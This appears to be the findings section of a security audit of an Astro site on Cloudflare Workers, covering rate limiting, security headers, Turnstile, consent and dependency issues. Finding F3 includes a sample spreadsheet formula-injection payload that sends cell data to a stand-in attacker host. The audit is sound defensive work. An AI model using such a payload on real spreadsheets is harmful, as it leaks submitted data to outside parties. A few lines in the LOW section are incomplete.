## Findings

### HIGH

**F1 — No rate limiting on form endpoints.**
Only `/api/track` rate-limits (in-memory, 10 req/60s, `src/pages/api/track.ts:122`,
and it does not survive Workers isolate recycling). `/api/contact`,
`/api/consultation` and `/api/order` have none — Turnstile raises the cost of
spam but a token-solving bot can flood Sheets/Resend quota. Fix: Cloudflare
KV- or Durable-Object-backed limiter (or a Cloudflare WAF rate-limiting rule
on `/api/*`, which needs no code).

**F2 — No Content-Security-Policy, no HSTS.**
`public/_headers` sets `X-Content-Type-Options`, `X-Frame-Options`,
`Referrer-Policy`, `Permissions-Policy` but no CSP and no
`Strict-Transport-Security`. For a GTM + Turnstile + CookieYes stack a
workable starting CSP exists in the astro-security skill. Note `_headers`
applies to static assets; verify SSR/API responses also get the headers
(middleware is the reliable place on Workers).

**F3 — Google Sheets formula injection.**
All three append calls use `valueInputOption=USER_ENTERED`
(`src/lib/order/sheets.ts:142`, `src/lib/forms/submit.ts:296`, `:671`), so a
lead named `=IMPORTXML("https://evil.tld/?"&A1;"//x")` executes as a formula
for whoever opens the sheet. Fix: switch to `valueInputOption=RAW` (values are
stored as literal strings; no formatting is needed for lead rows), or prefix
`=`, `+`, `-`, `@` values with `'`.

**F4 — Order endpoint Turnstile is fail-open.**
`src/pages/api/order.ts:91-101` verifies Turnstile only `if (turnstileSecret)`
— if the secret is ever unset in production, orders skip CAPTCHA entirely.
Contact/consultation use `verifyTurnstile()` unconditionally, which fails
closed (`src/lib/forms/turnstile.ts:27-33`). Make order match.

### MEDIUM

**F5 — CookieYes banner is not injected from site code.**
`BaseLayout.astro:231` renders `<Tracking gtmId="GTM-NW7DKC2D" …/>` without
`cookieYesId`, so `Tracking.astro:19` never injects the banner script. Consent
Mode v2 defaults everything to `denied` — correct — but if the banner isn't
loaded via a GTM tag either, visitors have no way to grant consent and
analytics/ads tags never fire (silent data loss), and the GDPR-required banner
is absent. **Verify the CookieYes tag exists in the GTM container; otherwise
pass `cookieYesId`.**

**F6 — `xlsx` high vulnerability (prototype pollution + ReDoS), no fix available.**
devDependency used only by 7 one-off import scripts in `scripts/`; never
bundled into client or Worker. Risk is limited to running those scripts on
untrusted `.xlsx` files. Options: accept (document), or move to the
maintained `xlsx` CDN build / `exceljs` when scripts are next touched.

**F7 — Honeypot rejection is not silent.**
Tripped honeypot returns a 422 naming the field ("Spam detected"), telling
bots exactly which field to leave empty. The astro-forms pattern is to return
a fake success.

### LOW

- **Unused devDependencies:** `fast-xml-parser`, `heic-convert` — referenced

  false positives: `fuse.js` is used by SearchOverlay, `tailwindcss` via the

- **Stray artifact:** `lighthouse-before.json` committed at repo root.
- `VideoDemo.astro` uses `role="button"` on a div for the video facade —
  keyboard handlers exist, but a semantic `<button>` would be cleaner.
